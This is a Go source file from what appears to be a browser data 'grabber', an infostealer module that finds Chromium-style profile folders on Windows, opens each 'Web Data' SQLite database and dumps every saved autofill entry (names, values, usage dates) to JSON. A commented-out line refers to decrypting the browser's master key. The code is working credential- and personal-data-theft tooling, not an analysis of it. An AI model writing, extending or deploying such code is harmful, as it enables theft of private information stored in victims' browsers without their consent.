package autofill

import (
	"database/sql"
	"encoding/json"
	"os"

	"example.com/grabber/browsers/util"
	_ "github.com/mattn/go-sqlite3"
)

type Autofill struct {
	Name           string `json:"name"`
	Value          string `json:"value"`
	Value_lower    string `json:"value_lower"`
	Date_created   string `json:"date_created"`
	Date_last_used string `json:"date_last_used"`
	Count          string `json:"count"`
}

func Get() string {
	var autofill []Autofill
	dpPaths := util.GetBPth()
	extraPaths := util.GetProfiles()
	for _, path := range dpPaths {
		// check if the path exists
		if _, err := os.Stat(path); os.IsNotExist(err) {
			continue
		}
		//master_key := decryption.GetMasterKey(path + "\\Local State")
		for _, profile := range extraPaths {
			if _, err := os.Stat(path + "\\" + profile); os.IsNotExist(err) {
				continue
			}
			path = path + "\\" + profile
			db, err := sql.Open("sqlite3", path+"\\Web Data")
			if err != nil {
				continue
			}
			defer db.Close()

			row, err := db.Query("SELECT name, value, value_lower, date_created, date_last_used, count FROM autofill")
			if err != nil {
				continue
			}
			defer row.Close()

			for row.Next() {
				var name string
				var value string
				var value_lower string
				var date_created string
				var date_last_used string
				var count string
				row.Scan(&name, &value, &value_lower, &date_created, &date_last_used, &count)
				autofill = append(autofill, Autofill{name, value, value_lower, date_created, date_last_used, count})
			}
		}
	}
	jsonData, err := json.MarshalIndent(autofill, "", "    ")
	if err != nil {
		return ""
	}
	return string(jsonData)
}
